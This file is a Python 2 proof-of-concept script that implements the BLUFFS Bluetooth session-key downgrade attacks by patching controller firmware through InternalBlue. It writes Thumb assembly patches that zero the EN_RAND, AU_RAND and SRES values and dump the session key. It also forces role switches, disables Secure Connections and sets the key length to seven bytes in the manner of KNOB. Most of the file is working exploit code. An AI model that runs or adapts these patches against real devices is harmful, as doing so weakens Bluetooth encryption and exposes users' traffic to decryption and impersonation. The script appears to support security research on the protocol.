#!/usr/bin/python2
"""
bluffs.py

Test the BLUFFS attacks (LSC and SC with downgrade).

"""
import struct

from pwn import *
from internalblue.hcicore import HCICore
from constants import *


def patch(name, trigger_addr, code_bstr, patch_addr):
    """
    Patch firmware at trigger_addr using code_bstr stored in
    RAM at patch_addr.
    """

    # write code into SRAM
    code = asm(code_bstr, patch_addr)
    internalblue.writeMem(patch_addr, code)

    # 4-byte align code (Thumb-2 mixes 2 and 4 byte instr)
    code_len = len(code)
    code_len += 4 - (code_len % 4)

    # patch ROM slot with a branch in Thumb-mode (Odd address)
    patch_rom = asm("b 0x{:x}".format(patch_addr + 1), vma=trigger_addr)
    internalblue.patchRom(trigger_addr, patch_rom)

    patch_addr_next = patch_addr + code_len
    # useful to insert the next patch
    return code_len, patch_addr_next


if __name__ == "__main__":
    HCI = 1
    internalblue = HCICore()
    # just use the first device
    internalblue.interface = internalblue.device_list()[0][HCI]
    # log.info("MEL: Using HCI{}".format(HCI))
    if not internalblue.connect():
        log.critical("MEL: No connection to target device.")
        exit(-1)

    patches = 0
    log.info("MEL: # ROM Patches")

    patches += 1
    name = "EN_RAND = 0x00"  # SD
    trigger_addr = 0xAE4B4  # _ape_action_txStartEncryptReq
    assert trigger_addr % 4 == 0
    patch_addr = 0x2006D0
    code_bstr = b"""
        @EN_RAND to 0 (all 4 byte instr)
        and r0, r0, #0x0
        str.w r0, [r4, #0x78]
        str.w r0, [r4, #0x7C]
        str.w r0, [r4, #0x80]
        str.w r0, [r4, #0x84]

        @Execute missed instruction
        ldrb.w r0, [r4, #0x57]

        @Jump to trigger_addr + 5
        b {}
    """.format(
        hex(trigger_addr + 5)
    )
    code_len, patch_addr2 = patch(name, trigger_addr, code_bstr, patch_addr)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr {}, code_len {}".format(
            patches, name, hex(trigger_addr), hex(patch_addr), hex(code_len)
        )
    )

    patches += 1
    name2 = "AU_RAND = 0x00"  # AC
    trigger_addr2 = 0xAEB8C  # _ape_action_txAuRand
    assert trigger_addr2 % 4 == 0
    code_bstr2 = b"""
        @AU_RAND to 0 (all 4 byte instr)
        and r0, r0, #0x0
        str.w r0, [r4, #0x78]
        str.w r0, [r4, #0x7C]
        str.w r0, [r4, #0x80]
        str.w r0, [r4, #0x84]

        @Execute missed instruction
        add.w r2, r4, #0x78

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr2 + 5)
    )
    code_len2, patch_addr3 = patch(name2, trigger_addr2, code_bstr2, patch_addr2)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr {}, code_len {}".format(
            patches, name2, hex(trigger_addr2), hex(patch_addr2), hex(code_len2)
        )
    )

    # patch: Print SK for LSC and SC
    patches += 1
    name3 = "Master SK value at 0x2007c0"
    trigger_addr3 = 0xAE5B4  # _ape_action_txStartEncryptReq
    assert trigger_addr3 % 4 == 0
    code_bstr3 = b"""
        @Execute first missed instructions
        @ r1 points to SK
        add r1, sp, #0x8

        @ save registers
        push {{r0, r2}}


        @Prepare addr to store SK
        ldr r0, =#0x2007c0
        ldr r2, [r1]
        str r2, [r0]
        ldr r2, [r1, #0x4]
        str r2, [r0, #0x4]
        ldr r2, [r1, #0x8]
        str r2, [r0, #0x8]
        ldr r2, [r1, #0xc]
        str r2, [r0, #0xc]


        @ restore registers
        pop {{r0, r2}}

        @Execute second missed instruction
        mov r0, r4

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr3 + 5)
    )
    code_len3, patch_addr4 = patch(name3, trigger_addr3, code_bstr3, patch_addr3)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name3,
            hex(trigger_addr3),
            hex(patch_addr3),
            hex(patch_addr3 + code_len3),
            hex(code_len3),
        )
    )

    patches += 1
    name4 = "Perip->Central switch when accepting a connection"
    trigger_addr4 = 0x2E7A8
    assert trigger_addr4 % 4 == 0
    code_bstr4 = b"""
        @Set role flag to master
        mov r6, #0x0

        @Execute missing instructions
        sub sp, #0x18
        add r0, #0xc

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr4 + 5)
    )
    code_len4, patch_addr5 = patch(name4, trigger_addr4, code_bstr4, patch_addr4)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name4,
            hex(trigger_addr4),
            hex(patch_addr4),
            hex(patch_addr4 + code_len4),
            hex(code_len4),
        )
    )

    patches += 1
    name5 = "Start auth as verifier after setup"
    trigger_addr5 = 0x11A58
    assert trigger_addr5 % 4 == 0
    code_bstr5 = b"""
        @Save lr
        push {{lr}}

        @Call lm_HandleHciAuthenticationReq
        bl 0xaec11

        @Execute missing instructions
        mov r0, #0x0
        str r0, [sp, #0x0]

        @Restore lr
        pop {{lr}}

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr5 + 5)
    )
    code_len5, patch_addr6 = patch(name5, trigger_addr5, code_bstr5, patch_addr5)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name5,
            hex(trigger_addr5),
            hex(patch_addr5),
            hex(patch_addr5 + code_len5),
            hex(code_len5),
        )
    )

    patches += 1
    name6 = "Enable encryption after auth"
    trigger_addr6 = 0x11CE4
    assert trigger_addr6 % 4 == 0
    code_bstr6 = b"""
        @Save registers
        push {{r0, r1, lr}}

        @ r4 points to ACLConn
        @Set bit 4 in encryptionRelatedFlagsAlsoWhetherEDR
        ldr r1, [r4, #0xa3]
        orr r1, r1, #0x10
        str r1, [r4, #0xa3]

        @Call SendLmpEncryptModeReq
        mov r0, r4
        ldr r1, =#0x1
        bl 0xaf2c5

        @Execute missed instruction
        ldrh.w r1, [r4, #0x64]

        @Restore registers
        pop {{r0, r1, lr}}

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr6 + 5)
    )
    code_len6, patch_addr7 = patch(name6, trigger_addr6, code_bstr6, patch_addr6)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name6,
            hex(trigger_addr6),
            hex(patch_addr6),
            hex(patch_addr6 + code_len6),
            hex(code_len6),
        )
    )

    patches += 1
    name7 = "Refuse LMP role switch"
    trigger_addr7 = 0xA643C  # _mss_handleLmpSwitchReq
    assert trigger_addr7 % 4 == 0
    code_bstr7 = b"""
        @ Load second parameter for isMssInstantPassed
        ldr r1, [r6, #0x0]

        @Call isMssInstantPassed
        bl #0xa63fe

        @Overwrite return value
        mov r0, #0x1

        @Jump to trigger_addr + 7
        b {}
        """.format(
        hex(trigger_addr7 + 7)
    )
    code_len7, patch_addr8 = patch(name7, trigger_addr7, code_bstr7, patch_addr7)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name7,
            hex(trigger_addr7),
            hex(patch_addr7),
            hex(patch_addr7 + code_len7),
            hex(code_len7),
        )
    )

    patches += 1
    name8 = "LSC SRES = 0x00"
    trigger_addr8 = 0xAEDC8  # _ape_action_txSres
    assert trigger_addr8 % 4 == 0
    code_bstr8 = b"""
        @Save registers
        push {{r0}}

        mov r0, #0x0
        str.w r0, [r4, #0x88]

        @Restore registers
        pop {{r0}}

        @Jump to trigger_addr + 5
        b {}
        """.format(
        hex(trigger_addr8 + 5)
    )
    code_len8, patch_addr9 = patch(name8, trigger_addr8, code_bstr8, patch_addr8)
    log.info(
        "MEL: Patch {}, {}, trigger_addr {}, patch_addr [{}, {}] {}".format(
            patches,
            name8,
            hex(trigger_addr8),
            hex(patch_addr8),
            hex(patch_addr8 + code_len8),
            hex(code_len8),
        )
    )

    ############################################ RAM ###############################################
    log.info("MEL: # RAM Memory Mods")

    # NOTE: disable SC
    SECURE_CONN = False
    byte1 = struct.unpack("<B", internalblue.readMem(0x200F2C, 1))[0]
    byte2 = struct.unpack("<B", internalblue.readMem(0x200F12, 1))[0]
    if SECURE_CONN:
        internalblue.writeMem(0x200F2C, struct.pack("<B", byte1 | 0b00001000))
        internalblue.writeMem(0x200F12, struct.pack("<B", byte2 | 0b00100000))
    else:
        internalblue.writeMem(0x200F2C, struct.pack("<B", byte1 & 0b11110111))
        internalblue.writeMem(0x200F12, struct.pack("<B", byte2 & 0b11011111))
    log.info("MEL: Memory Secure Connections: {}".format(SECURE_CONN))

    # NOTE: KMOB
    L_min = "\x07"
    L_max = "\x07"
    internalblue.writeMem(0x20118A, L_min)
    internalblue.writeMem(0x20118B, L_max)
    log.info(
        "MEL: Memory KNOB attack L_min: {}, L_max: {}".format(repr(L_min), repr(L_max))
    )

    internalblue.shutdown()
